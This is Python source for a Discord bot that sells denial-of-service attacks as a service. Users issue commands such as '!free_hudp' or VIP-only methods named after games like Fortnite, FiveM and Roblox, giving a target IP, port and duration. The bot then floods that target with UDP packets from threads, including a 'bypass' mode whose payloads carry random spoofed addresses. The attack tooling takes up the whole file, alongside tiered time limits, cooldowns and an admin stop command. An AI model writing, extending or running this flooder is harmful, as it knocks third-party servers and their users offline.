import discord
from discord.ext import commands
import asyncio
import threading
import socket
import time
import random
import struct

TOKEN = 'TU_TOKEN_DISCORD'  # Reemplaza con tu token

INTENTS = discord.Intents.default()
INTENTS.message_content = True
INTENTS.guilds = True
INTENTS.members = True

bot = commands.Bot(command_prefix='!', intents=INTENTS)

active_attacks = {}
cooldowns = {}
global_attack_running = False
admin_id = 1367535670410875070

vip_methods = [
    "udppps", "dnsbotnet", "discord", "udpgame", "udpbypass", "udpraw",
    "tcpbypass", "tcpproxies", "udpbotnet", "fornite", "fivem", "samp",
    "roblox", "udppackets", "udpsockets", "bypassreal"
]

def spoofed_ip():
    return ".".join(str(random.randint(1, 254)) for _ in range(4))

def bypass_attack(ip, port, duration, stop_event):
    timeout = time.time() + duration
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setblocking(False)

    count = 0
    while time.time() < timeout and not stop_event.is_set():
        try:
            spoof_ip = spoofed_ip()
            size = random.randint(512, 1400)
            payload = struct.pack('!4sH', socket.inet_aton(spoof_ip), random.randint(1, 65535))
            payload += random._urandom(size - len(payload))
            for _ in range(500):  # ~1 millón en total si loop ~2000 veces
                sock.sendto(payload, (ip, port))
                count += 1
        except:
            continue

def free_attack(ip, port, duration, stop_event):
    timeout = time.time() + duration
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setblocking(False)

    while time.time() < timeout and not stop_event.is_set():
        try:
            payload = random._urandom(4000)
            for _ in range(150):
                sock.sendto(payload, (ip, port))
        except:
            continue

async def start_attack(ctx, method, ip, port, duration, is_vip=False):
    global global_attack_running

    if not ip or not port or not duration:
        await ctx.send(f"❗ Uso: `!{method} <ip> <port> <time>`")
        return

    if ip == "127.0.0.1":
        await ctx.send("🚫 No puedes atacar a `127.0.0.1`.")
        return

    if not is_vip and duration > 60:
        await ctx.send("⏱️ Usuarios FREE tienen un límite de 60 segundos.")
        return

    if is_vip and duration > 300:
        await ctx.send("⏱️ VIP: límite máximo de 300 segundos.")
        return

    if ctx.author.id in active_attacks:
        await ctx.send("⛔ Ya tienes un ataque activo.")
        return

    if ctx.author.id in cooldowns:
        await ctx.send("⏳ Espera 30 segundos para volver a atacar.")
        return

    if global_attack_running:
        await ctx.send("⚠️ Solo se permite un ataque global activo.")
        return

    global_attack_running = True
    stop_event = threading.Event()
    active_attacks[ctx.author.id] = stop_event

    embed = discord.Embed(
        title="🚀 Ataque Iniciado",
        description=(
            f"**Método:** {method.upper()}\n"
            f"**IP:** `{ip}`\n"
            f"**Puerto:** `{port}`\n"
            f"**Tiempo:** `{duration}s`\n"
            f"**Usuario:** <@{ctx.author.id}>"
        ),
        color=discord.Color.red()
    )
    await ctx.send(embed=embed)

    attack_func = bypass_attack if is_vip else free_attack
    thread = threading.Thread(target=attack_func, args=(ip, port, duration, stop_event))
    thread.start()

    await asyncio.sleep(duration)

    if not stop_event.is_set():
        stop_event.set()
        await ctx.send(f"✅ Ataque finalizado para <@{ctx.author.id}>.")

    del active_attacks[ctx.author.id]
    cooldowns[ctx.author.id] = time.time()
    global_attack_running = False

    await asyncio.sleep(30)
    cooldowns.pop(ctx.author.id, None)

@bot.event
async def on_ready():
    print(f'✅ Bot conectado como {bot.user.name}')

@bot.command()
async def free_hudp(ctx, ip: str = None, port: int = None, duration: int = None):
    await start_attack(ctx, "free_hudp", ip, port, duration, is_vip=False)

def make_vip_command(method):
    @bot.command(name=method)
    async def cmd(ctx, ip: str = None, port: int = None, duration: int = None):
        roles = [r.name.lower() for r in ctx.author.roles]
        if "vip access" not in roles:
            await ctx.send("❌ Este método es solo para usuarios con el rol **VIP ACCESS**.")
            return
        await start_attack(ctx, method, ip, port, duration, is_vip=True)
    return cmd

# Generar comandos VIP
for method in vip_methods:
    make_vip_command(method)

@bot.command()
async def stop(ctx):
    if ctx.author.id not in active_attacks:
        await ctx.send("❌ No tienes ningún ataque activo.")
        return
    active_attacks[ctx.author.id].set()
    await ctx.send("🛑 Ataque detenido. Espera 30 segundos para otro.")
    del active_attacks[ctx.author.id]
    cooldowns[ctx.author.id] = time.time()
    global global_attack_running
    global_attack_running = False
    await asyncio.sleep(30)
    cooldowns.pop(ctx.author.id, None)

@bot.command()
async def stopall(ctx):
    if ctx.author.id != admin_id:
        await ctx.send("❌ Solo el administrador puede detener todos los ataques.")
        return
    for stop_event in active_attacks.values():
        stop_event.set()
    active_attacks.clear()
    global global_attack_running
    global_attack_running = False
    await ctx.send("🛑 Todos los ataques fueron detenidos.")

@bot.command()
async def methods(ctx):
    embed = discord.Embed(title="💥 Métodos Disponibles", color=discord.Color.blue())
    embed.add_field(name="!free_hudp", value="Método gratuito UDP (máx 60s)", inline=False)
    for m in vip_methods:
        embed.add_field(name=f"!{m}", value="(VIP ACCESS, BYPASSING ALL METHODS!)", inline=True)
    await ctx.send(embed=embed)

bot.run(TOKEN)
